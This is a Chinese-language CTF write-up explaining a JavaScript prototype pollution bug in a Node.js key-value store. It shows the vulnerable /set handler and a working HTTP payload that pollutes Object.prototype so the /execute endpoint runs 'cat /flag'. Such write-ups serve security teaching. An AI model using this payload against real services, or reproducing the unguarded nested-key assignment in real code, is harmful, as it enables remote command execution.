# Node.js is Web Scale

一个典型的 JavaScript 原型链污染漏洞。

预定义命令 `cmds`，`getsource` 用于显示源码，`test` 用于测试：

```javascript
let cmds = {
    getsource: "cat server.js",
    test: "echo 'hello, world!'",
};
```

使用对象实现键值存储：

```javascript
let store = {};
```

提供了四个 API：

- `GET /api/store`: 返回整个存储内容
- `POST /set`: 设置键值对，支持 `a.b.c` 格式嵌套的 key
- `GET /get`: 获取指定 key 的 value
- `GET /execute`: 执行预定义命令

重点关注 `/set` 里的代码处理逻辑：

```javascript
app.post("/set", (req, res) => {
    const {
        key,
        value
    } = req.body; // 从请求体获取 key 和 value

    const keys = key.split("."); // 将 key 按照 . 分割，支持多级属性
    let current = store;

    for (let i = 0; i < keys.length - 1; i++) {
        const key = keys[i];
        if (!current[key]) {
            current[key] = {}; // 如果中间节点不存在，创建空对象
        }
        current = current[key]; // 移动到下一层
    }

    current[keys[keys.length - 1]] = value; // 在最后一个 key 处设置 value

    res.json({
        message: "OK"
    });
});
```

当传入 `key=__proto__.newkey` 时：

- `current` 初始指向 `store`，一个空对象
- `current[__proto__]` 会访问对象的原型链上的 `Object.prototype` 对象
- `current[__proto__][newkey] = value` 会修改 Object.prototype，从而污染所有继承自该原型的对象

所以传入以下 Payload 时：

```http
POST /set HTTP/1.1
{
    "key": "__proto__.newcmd",
    "value": "cat /flag"
}
```

这会使 `newcmd` 属性被添加到 `Object.prototype` 上，因此所有以 `Object.prototype` 为原型的对象（包括 `cmds` 对象）都能通过原型链访问到这个属性。

于是可以通过 `/execute?cmd=newcmd` 来执行命令 `cat /flag`：

```http
GET /execute?cmd=newcmd HTTP/1.1
```
